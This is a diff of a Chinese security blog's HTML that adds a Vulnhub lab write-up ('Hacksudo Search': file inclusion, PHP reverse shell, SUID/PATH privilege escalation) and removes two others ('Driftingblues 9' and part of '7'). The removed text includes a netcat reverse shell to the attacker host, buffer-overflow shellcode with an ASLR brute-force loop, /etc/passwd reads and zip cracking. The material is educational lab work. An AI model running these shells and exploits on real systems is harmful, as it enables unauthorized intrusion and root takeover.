+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Fastjson/" rel="tag">Fastjson</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/03/Hacksudo-Search/">
+                Hacksudo Search
+            </a>
+        </h2>
+    
+    <time>
+        Aug 3, 2022
+    </time>
+    <section class="content">
+        <h1><span id="hacksudosearch">Hacksudo:Search</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称hacksudosearch">名称：hacksudo:search</span></h4><h4><span id="发布日期2021416">发布日期：2021.4.16</span></h4><h4><span id="作者vishal-waghmare">作者：Vishal Waghmare</span></h4><h4><span id="系列hacksudo">系列：hacksudo</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt</p>
+<h4><span id="难度简单">难度：简单</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名hacksudo-searchzip">文件名：hacksudo-search.zip</span></h4><h4><span id="文件大小853mb">文件大小：853MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagehacksudohacksudo-searchzip">下载地址：</span></h4><h4><span id="md5-da5af5ca7de9c5fe77cf351631d262a7">MD5: DA5AF5CA7DE9C5FE77CF351631D262A7</span></h4><h4><span id="sha1-28c122bcbd488ffa4b9660123d0a07dafd065581">SHA1: 28C122BCBD488FFA4B9660123D0A07DAFD065581</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机Search和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/03/Hacksudo-Search/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/03/Hacksudo-Search/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/03/Hacksudo-Search/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放22，80端口，访问主页是一个搜索框，同时可以直接看到search.php：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.111 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/03/Hacksudo-Search/4.png" alt="image-"></p>
+<p><img src="/2022/08/03/Hacksudo-Search/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，发现一个search1.php的文件，可以进行访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.111/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/03/Hacksudo-Search/6.png" alt="image-"></p>
+<p><img src="/2022/08/03/Hacksudo-Search/7.png" alt="image-"></p>
+</blockquote>
+<h3><span id="发现文件包含漏洞">发现文件包含漏洞</span></h3><blockquote>
+<p>1.访问search1.php文件发现比search.php多了上栏，且通过修改About页地址me大小写，能够发现存在文件包含漏洞，在源码中也有提示：</p>
+<p><img src="/2022/08/03/Hacksudo-Search/8.png" alt="image-"></p>
+<p>2.可以通过页面输出内容，也可用测试存在RFI：</p>
+<p><img src="/2022/08/03/Hacksudo-Search/9.png" alt="image-"></p>
+</blockquote>
+<h3><span id="上传webshell">上传webshell</span></h3><blockquote>
+<p>1.修改kali自带的webshell，&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php，在同目录下kali开启http服务：</p>
+<p><img src="/2022/08/03/Hacksudo-Search/10.png" alt="image-"></p>
+<p><img src="/2022/08/03/Hacksudo-Search/11.png" alt="image-"></p>
+<p>2.通过文件包含漏洞让靶机获取webshell，kali开启监听端口，访问触发，再用python构建交互式shell：</p>
+<p><img src="/2022/08/03/Hacksudo-Search/12.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/03/Hacksudo-Search/13.png" alt="image-"></p>
+<p>3.在&#x2F;usr&#x2F;www&#x2F;html目录下能够发现一个.env文件，文件内有一个数据库用户和密码，但是无法登录：</p>
+<p><img src="/2022/08/03/Hacksudo-Search/14.png" alt="image-"></p>
+<p>4.后来发现，这个密码是hacksudo用户ssh登录的密码，用户目录下user.txt即是第一个flag：</p>
+<p><img src="/2022/08/03/Hacksudo-Search/15.png" alt="image-"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.进入hacksudo用户，查看具有root权限的suid文件，尝试提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/03/Hacksudo-Search/16.png" alt="image-"></p>
+<p>2.查询到cpulimit文件，再去<a target="_blank" rel="noopener" href="https://gtfobins.github.io/%E6%9F%A5%E8%AF%A2%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%EF%BC%9A">https://gtfobins.github.io/查询提权方式：</a></p>
+<p><img src="/2022/08/03/Hacksudo-Search/17.png" alt="image-"></p>
+<p>3.成功登录root用户，在&#x2F;root目录下发现flag，root.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &#x27;/bin/bash -i&#x27; &gt; install</span><br><span class="line">chmod +x install</span><br><span class="line">cd ~/search/tools/</span><br><span class="line">export PATH=/tmp/:$PATH</span><br><span class="line">./searchinstall -p</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/03/Hacksudo-Search/18.png" alt="image-"></p>
+<p>4.在&#x2F;root目录下，可以找到flag，即root.txt:</p>
+<p><img src="/2022/08/03/Hacksudo-Search/19.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Hacksudo/" rel="tag">Hacksudo</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
   
     <article class="post ">
 
@@ -714,208 +957,6 @@
     </section>
 </article>
   
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/06/Driftingblues-9/">
-                Driftingblues 9
-            </a>
-        </h2>
-    
-    <time>
-        Jun 6, 2022
-    </time>
-    <section class="content">
-        <h1><span id="driftingblues9">Driftingblues:9</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称driftingblues9final">名称：DriftingBlues:9(final)</span></h4><h4><span id="发布日期202159">发布日期：2021.5.9</span></h4><h4><span id="作者tasiyanci">作者：tasiyanci</span></h4><h4><span id="系列driftingblues">系列：DriftingBlues</span></h4><h4><span id="推特tasiyanci">推特：@tasiyanci</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt </p>
-<h4><span id="难度困难">难度：困难</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名driftingblues9ova">文件名：driftingblues9.ova</span></h4><h4><span id="文件大小738mb">文件大小：738MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagedriftingbluesdriftingblues9ova">下载地址：</span></h4><h4><span id="md5-db7d1b48224f802666b07693acd7cdb4">MD5: DB7D1B48224F802666B07693ACD7CDB4</span></h4><h4><span id="sha1-cd8c690150b48ac4ab9e6a3d56a4f12f110c78c1">SHA1: CD8C690150B48AC4AB9E6A3D56A4F12F110C78C1</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机driftingblues9和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/06/Driftingblues-9/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现开放了80和111端口，访问主页查看源码，发现是一个ApPHP页面：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.120 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/4.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-9/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现好些目录，但也没有进一步有价值的信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.120 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="apphp漏洞利用">ApPHP漏洞利用</span></h3><blockquote>
-<p>1.在主页面能够发现一个admin登录页面：</p>
-<p><img src="/2022/06/06/Driftingblues-9/7.png" alt="image-"></p>
-<p>2.因为源码提示了我们ApPHP的相关信息，我们可以去Exploit-db(<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/33070)%E6%9F%A5%E6%89%BE%E5%88%B0%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9A">https://www.exploit-db.com/exploits/33070)查找到相关漏洞利用：</a></p>
-<p><img src="/2022/06/06/Driftingblues-9/8.png" alt="image-"></p>
-<p>3.执行相关python程序，我们可以获得较基础的权限：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 33070.py http://192.168.56.120</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/9.png" alt="image-"></p>
-</blockquote>
-<h3><span id="初步提权">初步提权</span></h3><blockquote>
-<p>1.利用得到的用户我们可以查看&#x2F;var&#x2F;www&#x2F;include&#x2F;base.inc.php文件下，有clapton用户及其密码，其实上面程序已经爆出来了：</p>
-<p><img src="/2022/06/06/Driftingblues-9/10.png" alt="image-"></p>
-<p>2.此时我们要先想办法建立交互式shell，先在kali开启端口监听，再利用靶机端返回shell：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444，kali开启端口监听</span><br><span class="line">which nc，靶机返回shell</span><br><span class="line">nc 192.168.56.102 4444 -e /bin/bash</span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;，kali再使用python建立交互式shell</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/11.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-9/12.png" alt="image-"></p>
-<p>3.现在我们可以先确认clapton用户的存在，再进行登录了：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd，确认存在clapton</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/13.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-9/14.png" alt="image-"></p>
-</blockquote>
-<h3><span id="缓冲区溢出利用">缓冲区溢出利用</span></h3><blockquote>
-<p>1.在clapton用户目录下，我们能发现第一个flag，user.txt，而另一个note.txt文件查看后是关于缓冲区溢出的提示：</p>
-<p><img src="/2022/06/06/Driftingblues-9/15.png" alt="image-"></p>
-<p>2.除了两个txt文本文件以外，还有一个input文件，这个文件用file命令查看后，明显是要对这个文件进行缓冲区溢出提权：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file input</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/16.png" alt="image-"></p>
-<p>3.我们将input文件获取到本地，用checksec查看，该文件并没有启用任何保护措施：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8001，clapton开启http服务（尝试使用了python3 -m http.server 8001，发现靶机没有python3）</span><br><span class="line">wget http://192.168.56.120:8001/input，kali获取input</span><br><span class="line">checksec --file=input</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/17.png" alt="image-"></p>
-<p>4.使用命令修改input文件所有者，并赋予程序特殊权限：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo chown 0:0 input</span><br><span class="line">sudo chmod 4755 input</span><br><span class="line">ls -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/18.png" alt="image-"></p>
-<p>5.使用cyclic生成500个字符组成的字符串用于计算偏移量：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3</span><br><span class="line">from pwn import *</span><br><span class="line">cyclic(500)</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/19.png" alt="image-"></p>
-<p>6.然后关闭kali的ASLR，启动gdb调试input程序，将500个字符组成的字符串传入程序并运行后程序奔溃，EIP寄存器的值为“0x61617362”：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br><span class="line">gdb input</span><br><span class="line"></span><br><span class="line">r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/20.png" alt="image-"></p>
-<p>7.再次利用cyclic计算偏移量得到171，那么payload构造为“171个A”+“jmp esp地址”+Shellcode：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic_find(0x61617362)</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/21.png" alt="image-"></p>
-<p>8.在kali使用edb-debugger，随便传入参数调试程序，运行程序后Ctrl+O寻找jmp esp指令地址：</p>
-<p><img src="/2022/06/06/Driftingblues-9/22.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-9/23.png" alt="image-"></p>
-<p>9.选择r-x权限下的第一个jmp esp地址，写入payload，在kali上可以成功获得root权限：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./input `python -c &quot;print &#x27;A&#x27;*171+&#x27;\x70\xbe\xe0\xf7&#x27;+&#x27;\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&#x27;&quot;`</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/24.png" alt="image-"></p>
-<p>10.但同样的payload在clapton用户上并不能起效，原因是靶机开启了ASLR而我们无权限关闭，且靶机的偏移地址是jmp esp相对libc基址的偏移地址，kali下的libc.so.6文件与靶机不同；所以这里我们采用循环绕过ASLR:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb ./input，在clapton上测定偏移地址</span><br><span class="line">run $(python -c &#x27;print &quot;A&quot; * 171 + &quot;B&quot; * 5 + &quot;\x90&quot; * 2000&#x27;)，在kali上我们已经测得程序溢出位置偏移量为171，clapton上也如此</span><br><span class="line">x/s $esp，得到jmp esp相对libc基址的偏移地址</span><br><span class="line">q y，退出gdb调试</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/25.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;1..10000&#125;; do (./input $(python -c &#x27;print &quot;A&quot; * 171 + &quot;\xe0\xd6\x9e\xbf&quot; + &quot;\x90&quot; * 2000 + &quot;\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80&quot;&#x27;)); done，循环绕过ASLR</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/26.png" alt="image-"></p>
-</blockquote>
-<h3><span id="flag获取">Flag获取</span></h3><blockquote>
-<p>1.通过利用缓冲区溢出漏洞，我们成功提权到root，在&#x2F;root目录下能够找到flag，即root.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/27.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Driftingblues/" rel="tag">Driftingblues</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/06/Driftingblues-7/">
-                Driftingblues 7
-            </a>
-        </h2>
-    
-    <time>
-        Jun 6, 2022
-    </time>
-    <section class="content">
-        <h1><span id="driftingblues7">Driftingblues:7</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称driftingblues7">名称：DriftingBlues:7</span></h4><h4><span id="发布日期2021421">发布日期：2021.4.21</span></h4><h4><span id="作者tasiyanci">作者：tasiyanci</span></h4><h4><span id="系列driftingblues">系列：DriftingBlues</span></h4><h4><span id="推特tasiyanci">推特：@tasiyanci</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;flag.txt </p>
-<h4><span id="难度中等">难度：中等</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名driftingblues7_vhova">文件名：driftingblues7_vh.ova</span></h4><h4><span id="文件大小13gb">文件大小：1.3GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagedriftingbluesdriftingblues7_vhova">下载地址：</span></h4><h4><span id="md5-db16d916b288f8a6440d17046ee99064">MD5: DB16D916B288F8A6440D17046EE99064</span></h4><h4><span id="sha1-39824d3eb1d8da9118a12463b19503d93903b038">SHA1: 39824D3EB1D8DA9118A12463B19503D93903B038</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxcentos">操作系统：Linux(centos)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机driftingblues7和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/06/Driftingblues-7/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现很多端口都是开放的，访问主页查看源码，发现是一个EyesOfNetwork的登录页：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.119 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/4.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-7/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，爆出的目录我们都无法访问，必须要先登录：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb https://192.168.56.119，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="eyesofnetwork登录">EyesOfNetwork登录</span></h3><blockquote>
-<p>1.因为开放了多个端口，我们逐一进行访问，访问192.168.56.119:66，源码内没有过多线索：</p>
-<p><img src="/2022/06/06/Driftingblues-7/7.png" alt="image-"></p>
-<p>2.我们对66端口下的目录再次进行扫描，直接扫出了一个flag.txt文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.119:66 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，对66端口下目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/8.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.56.119:66/flag.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/9.png" alt="image-"></p>
-<p>3.这个应该是作者忘记删除的flag文件了，其实应该是想让我们发现eon这个文件：</p>
-<p><img src="/2022/06/06/Driftingblues-7/10.png" alt="image-"></p>
-<p>4.查看eno文件，发现是一串base64编码，解码后发现格式是压缩文件的格式，于是把它解码为application.zip（这里用到了这个在线工具：<a target="_blank" rel="noopener" href="https://base64.guru/converter/decode/file%EF%BC%89%EF%BC%9A">https://base64.guru/converter/decode/file）：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.56.119:66/eon</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/11.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo UEsDBBQAAQAAAAOfg1LxSVvWHwAAABMAAAAJAAAAY3JlZHMudHh093OsvnCY1d4tLCZqMvRD+ZUURw+5YmOf9bS11scvmFBLAQI/ABQAAQAAAAOfg1LxSVvWHwAAABMAAAAJACQAAAAAAAAAIAAAAAAAAABjcmVkcy50eHQKACAAAAAAAAEAGABssaU7qijXAYPcazaqKNcBg9xrNqoo1wFQSwUGAAAAAAEAAQBbAAAARgAAAAAA | base64 -d</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/12.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-7/13.png" alt="image-"></p>
-<p>5.利用zip2john对application.zip进行解密，再用john得到密码，查看creds.txt获得用户和密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip2john application.zip | tee hash</span><br><span class="line">john hash --wordlist=/home/kali/Desktop/rockyou.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/14.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-7/15.png" alt="image-"></p>
-</blockquote>
-<h3><span id="eyesofnetwork版本漏洞利用">EyesOfNetwork版本漏洞利用</span></h3><blockquote>
-<p>1.利用得到的用户和密码登录EyesOfNetwork后台，发现在Help-EyesOfNetwork页可以发现EyesOfNetwork的版本为5.3：</p>
-<p><img src="/2022/06/06/Driftingblues-7/16.png" alt="image-"></p>
-<p>2.可以找到这个版本的漏洞利用文件，<a target="_blank" rel="noopener" href="https://github.com/h4knet/eonrce/blob/master/eonrce.py%EF%BC%8C%E8%8E%B7%E5%8F%96%E4%B8%8B%E6%9D%A5%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%88%A9%E7%94%A8%EF%BC%9A">https://github.com/h4knet/eonrce/blob/master/eonrce.py，获取下来可以直接利用：</a></p>
